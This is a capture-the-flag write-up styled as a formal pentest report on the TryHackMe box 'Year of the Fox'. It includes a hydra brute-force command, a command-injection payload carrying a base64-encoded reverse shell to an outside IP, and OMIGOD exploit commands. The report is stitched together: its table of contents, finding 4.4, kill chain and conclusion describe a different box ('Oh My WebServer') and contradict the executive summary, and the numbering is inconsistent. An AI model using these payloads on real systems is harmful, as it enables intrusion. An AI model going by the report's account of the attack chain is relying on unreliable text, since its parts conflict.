---
title: Formal Report
parent: Year of the Fox
grand_parent: THM Boxes
nav_order: 1
---

# Findings Report

**Target:** Year of the Fox (TryHackMe Boot-to-Root Assessment)

<table>
  <tr>
    <td><strong>Target Host</strong></td>
    <td>10.x.x.x (TryHackMe assigned IP)</td>
  </tr>
  <tr>
    <td><strong>Assessment Type</strong></td>
    <td>Black-box</td>
  </tr>
  <tr>
    <td><strong>Assessor</strong></td>
    <td>Vanik</td>
  </tr>
  <tr>
    <td><strong>Report Date</strong></td>
    <td>12 August 2026</td>
  </tr>
  <tr>
    <td><strong>Overall Risk Rating</strong></td>
    <td>Critical</td>
  </tr>
</table>

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope](#2-scope)
3. [Methodology](#3-methodology)
4. [Detailed Findings](#4-detailed-findings)
   - 4.1 [Unauthenticated RCE via Apache HTTP Server Path Traversal (CVE-2021-41773 / CVE-2021-42013)](#41-unauthenticated-rce-via-apache-http-server-path-traversal-cve-2021-41773--cve-2021-42013)
   - 4.2 [Local Privilege Escalation via Misconfigured Python Binary Capabilities](#42-local-privilege-escalation-via-misconfigured-python-binary-capabilities)
   - 4.3 [Insufficient Network Segmentation Between Container and Docker Host](#43-insufficient-network-segmentation-between-container-and-docker-host)
   - 4.4 [Unauthenticated RCE via Exposed OMI Service on Docker Host (CVE-2021-38647 "OMIGOD")](#44-unauthenticated-rce-via-exposed-omi-service-on-docker-host-cve-2021-38647-omigod)
5. [Attack Narrative / Kill Chain](#5-attack-narrative--kill-chain)
6. [Summary of Recommendations](#6-summary-of-recommendations)
7. [Conclusion](#7-conclusion)
8. [Appendix: Tools Used](#8-appendix-tools-used)

---

## 1. Executive Summary

This report documents a black-box penetration test performed against the "Year of the Fox" host, a TryHackMe boot-to-root exercise. The objective of the assessment was to identify and exploit vulnerabilities that would allow an unauthenticated attacker to compromise the confidentiality, integrity, and availability of the target environment.

The assessment identified a critical chain of vulnerabilities beginning with a password brute force on teh webserver's http authentication prompt bypassing the weak password of the ```rascal``` user, a command injection flaw on the custom webserver leading to a reverse shell, laterally pivoting from the ```www-data``` user to the ```fox``` user via brute forcing ssh, and escalating to root within the compromised machine via misconfigured Linux ```$PATH``` security.

In total, four findings were identified and are summarized below.

<table>
  <tr>
    <th>#</th>
    <th>Finding</th>
    <th>Severity</th>
    <th>CVSS 3.1</th>
  </tr>
  <tr>
    <td>1</td>
    <td>Local User disclosure via misconfigured Samba share</td>
    <td>🟢 Low</td>
    <td>5.3</td>
  </tr>
  <tr>
    <td>2</td>
    <td>Unauthenticated login to password protected web-server via brute forcing</td>
    <td>🟠 High</td>
    <td>7.5</td>
  </tr>
   <tr>
    <td>2</td>
    <td>Command Injection via Input Validation Flaw</td>
    <td>🟠 High</td>
    <td>7.6</td>
  </tr>
  <tr>
    <td>4</td>
    <td>Lateral Movement to fox user via ssh brute-forcing</td>
    <td>🟠 High</td>
    <td>7.6</td>
  </tr>
  <tr>
    <td>5</td>
    <td>Privilege Escalation to root via PATH hijacking</td>
    <td>🔴 Critical</td>
    <td>8.8</td>
  </tr>
</table>

Chained together, these findings resulted in full compromise of the the web-facing machine, from unauthenticated network access to root-level code execution on the host machine.

---

## 2. Scope

<table>
  <tr>
    <td><strong>In-Scope Host</strong></td>
    <td>Web container: TryHackMe assigned IP &nbsp;|&nbsp;</td>
  </tr>
  <tr>
    <td><strong>In-Scope Ports</strong></td>
    <td>22 (local host SSH, discovered), 80 (HTTP), 445 (Samba)</td>
  </tr>
  <tr>
    <td><strong>Testing Type</strong></td>
    <td>Black-box, unauthenticated, external</td>
  </tr>
  <tr>
    <td><strong>Rules of Engagement</strong></td>
    <td>TryHackMe standard lab terms of service</td>
  </tr>
</table>

---

## 3. Methodology

The assessment followed a standard black-box methodology with the following phases:

- Reconnaissance & Service Enumeration (Nmap, smbmap, enum4linux)
- Brute Forcing (hydra)
- Exploitation of Web-Facing Vulnerabilities (command injection vulnerability in webapp exploited via burp-suite)
- Post-Exploitation & Local Privilege Escalation (LinPEAS, Linux $PATH security misconfiguration)

---

## 4. Detailed Findings

### 4.1 Locla User disclosure via misconfigured Samba Share

<table>
  <tr>
    <td><strong>Severity</strong></td>
    <td>Low</td>
  </tr>
  <tr>
    <td><strong>CVSS 3.1 Vector</strong></td>
    <td><code>AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N</code> (5.3)</td>
  </tr>
  <tr>
    <td><strong>Affected Component</strong></td>
    <td>Machine Samba Share</td>
  </tr>
</table>

**Description**

Initial recon via nmap returned ports running SMB. Using the ```smbmap``` and ```enum4linux``` tools, all local user accounts were enumerated, which led to brute forcing the web authentication prompt on the webserver for the ```rascal``` user.

**Proof of Concept**

smbmap returned all shares on teh machines samba share:

```
<img width="2194" height="888" alt="image" src="https://github.com/user-attachments/assets/a458f6d9-7c1b-4ef6-9f01-9173b7571df3" />

```

```enum4linux``` returned all local users on the machine:

```
<img width="1238" height="190" alt="image" src="https://github.com/user-attachments/assets/f3f5e35a-8567-4d25-beae-b6fa2a21ae08" />

```

**Impact**

This finding allowed a fully remote attacker to enumerate all local users on the machine..

**Remediation**

- Disable 'null' sessions on samba to prevent unauthenticated samba enumeration.
- Segemnt your samba share so only those who require access have access (VLAN, VPN to VLAN for remote users, etc.).

---

### 4.2 Unauthenticated login to password protected web-server via brute forcing

<table>
  <tr>
    <td><strong>Severity</strong></td>
    <td>High</td>
  </tr>
  <tr>
    <td><strong>CVSS 3.1 Vector</strong></td>
    <td><code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code> (7.5)</td>
  </tr>
  <tr>
    <td><strong>Affected Component</strong></td>
    <td><code>HTTP Basic Authentication</code></td>
  </tr>
</table>

**Description**

Following local user enumeration, brute forcing using the accounts ```fox``` and ```rascal``` revealed the password for the ```rascal``` user which gave access to the internal webapp.

**Proof of Concept**

```bash
hydra -l rascal -P /usr/share/wordlists/rockyou.txt <IP> http-head -m / -vvv -t 30
```

Execution of this one-line command returned a the password for the ```rascal``` user.

**Impact**

An unauthenticated attacker can get a valid password of a valid local user just with enumeration and brute forcing via a one line command, which would grant them access to the password-protected webapp.

**Remediation**

- Implement a strict password policy to prevent attackers from being able to brute force simple passwords
- Implement a form of an IP based ACL to prevent access to the webapp even if an attacker managed to get your password.

---

### 4.3 Command Injection via Input Validation Flaw

<table>
  <tr>
    <td><strong>Severity</strong></td>
    <td>Medium</td>
  </tr>
  <tr>
    <td><strong>CVSS 3.1 Vector</strong></td>
    <td><code>AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L</code> (7.6)</td>
  </tr>
  <tr>
    <td><strong>Affected Component</strong></td>
    <td><code>Custom Rascal's Search System Webapp</code>)</td>
  </tr>
</table>

**Description**

After brute forcing the ```rascal``` user's password and logging into the webapp, the underlying php code taht the webapp runs on renders the search input vulnerable to command injection due to a flaw in its input validation.

**Proof of Concept**

Capturing a request to the page via burpsuite, a JSON with a target field is able to be edited to have a reverse shell in its value enabling RCE using quote escaping.

Payload:

```bash
\"; echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzAuMTM1LzkwMDEgMD4mMQ== | base64 -d | bash; #
```

Full Post Request:

<img width="629" height="453" alt="image" src="https://github.com/user-attachments/assets/fba44988-5472-4457-a391-48ea00157679" />


This payload tricked the php web app by closing the quote with a literal quote, then executing the following commands (a base64 encoded reverse shell that is subsequently decoded and then piped over to bash to be executed, and then a php comment symbol to render all code that comes after useless.

**Impact**

This vulnerability in input validation allowed command injection to take place enabling an authenticated attacker to send a reverse shell payload and achieve remote code execution as the ```www-data``` user on the underlying machine as seen in the screenshot below:

<img width="1134" height="468" alt="image" src="https://github.com/user-attachments/assets/9b3529fd-6b57-4a2b-bba5-b7345a679d78" />

**Remediation**

- 
- Implement a Web Application Firewall (WAF) to detect and prevent command injection and other web exploitation techniques.
- Treat the container-to-host network boundary as a genuine trust boundary requiring explicit, minimal allow-rules rather than default bridge connectivity.

---

### 4.4 Unauthenticated RCE via Exposed OMI Service on Docker Host (CVE-2021-38647 "OMIGOD")

<table>
  <tr>
    <td><strong>Severity</strong></td>
    <td>Critical</td>
  </tr>
  <tr>
    <td><strong>CVSS 3.1 Vector</strong></td>
    <td><code>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code> (9.8)</td>
  </tr>
  <tr>
    <td><strong>Affected Component</strong></td>
    <td>Open Management Infrastructure (OMI) service, TCP/5986, on <code>172.17.0.1</code></td>
  </tr>
</table>

**Description**

Port 5986 on the Docker host was identified as belonging to Microsoft's Open Management Infrastructure (OMI), commonly bundled with Azure Linux VM management agents. This service is affected by CVE-2021-38647 ("OMIGOD"), a critical unauthenticated remote code execution vulnerability caused by OMI accepting requests without authentication headers under certain configurations.

**Proof of Concept**

A public proof-of-concept exploit script for CVE-2021-38647 was transferred to the container and used to validate the vulnerability with a benign command:

```bash
python3 omigod_exploit.py -t 172.17.0.1 -p 5986 -c id
```

The command executed successfully, confirming unauthenticated code execution. The payload was then changed to a reverse shell:

```bash
python3 omigod_exploit.py -t 172.17.0.1 -p 5986 -c "<reverse_shell_command>"
```

A callback was received on a local listener as the Docker host machine, confirming full container escape and host compromise.

**Impact**

This finding results in complete unauthenticated remote code execution on the physical/virtual host underlying the container infrastructure, from a position with no legitimate credentials, fully breaking the isolation boundary the container was expected to provide.

**Remediation**

- Patch OMI to a version that enforces authentication on all management requests, or remove OMI entirely if Azure VM management is not required.
- Restrict access to OMI's listening ports to trusted management networks only, never to application container networks.
- As with Finding 4.3's remediation, proper network segmentation would have prevented this service from being reachable in the first place, providing defense-in-depth even if a future OMI-class vulnerability is discovered.

---

## 5. Attack Narrative / Kill Chain

1. Enumerated open ports via Nmap: 22 (SSH) and 80 (HTTP).
2. Performed content discovery with Gobuster and virtual host enumeration; found only a static landing page and an exposed `/assets` directory listing.
3. Ran Nuclei against the web server and identified a known Apache HTTP Server vulnerability (CVE-2021-41773 / CVE-2021-42013).
4. Exploited the vulnerability using a public proof-of-concept script to obtain an initial interactive shell (Finding 4.1).
5. Upgraded the shell to a stable Python-based reverse shell.
6. Identified a root-owned `.dockerenv` file, confirming a containerized foothold.
7. Ran LinPEAS and discovered the `python3` binary held the `cap_setuid` Linux capability.
8. Escalated to root within the container using a one-line Python `os.setuid(0)` command (Finding 4.2).
9. Confirmed the container resided on a Docker bridge network with the host reachable as a network peer at `172.17.0.1` (Finding 4.3).
10. Transferred a static Nmap binary into the container and scanned the Docker host, identifying an exposed OMI service on port 5986.
11. Exploited CVE-2021-38647 ("OMIGOD") against the Docker host and obtained a reverse shell as the host machine (Finding 4.4).

---

## 6. Summary of Recommendations

The following remediation actions, in priority order, would have prevented or substantially disrupted this attack chain:

- **Patch Apache HTTP Server** to a version unaffected by CVE-2021-41773 / CVE-2021-42013, eliminating the initial foothold.
- **Remove unnecessary Linux capabilities** from interpreters and general-purpose binaries such as `python3`, eliminating the trivial root escalation path inside the container.
- **Enforce network segmentation** between application containers and the Docker host, ensuring host-level management services are never reachable from container networks.
- **Patch or remove the OMI service** on the Docker host, or at minimum restrict it to trusted management-only network segments.
- **Regularly audit container images and host configurations** for excessive capabilities, unnecessary exposed services, and default bridge network trust assumptions.

---

## 7. Conclusion

The Oh My WebServer host chain was fully compromised from an unauthenticated, external starting position through to root-level code execution on the underlying Docker host. The root cause was a combination of an unpatched, publicly known web server vulnerability, an unnecessary and dangerous Linux capability assignment, and a container network configuration that failed to isolate the host from a compromised application container. Addressing any single one of these issues would have independently broken this attack chain before it reached the underlying host.

---

## 8. Appendix: Tools Used

- **Nmap** — service and port enumeration (both external and internal/container-scoped)
- **Gobuster** — web content and directory discovery
- **Nuclei** — automated vulnerability scanning
- **LinPEAS** — local privilege escalation enumeration
- **Netcat** — reverse shell listener
- **Public CVE proof-of-concept scripts** — CVE-2021-41773/CVE-2021-42013 and CVE-2021-38647 exploitation
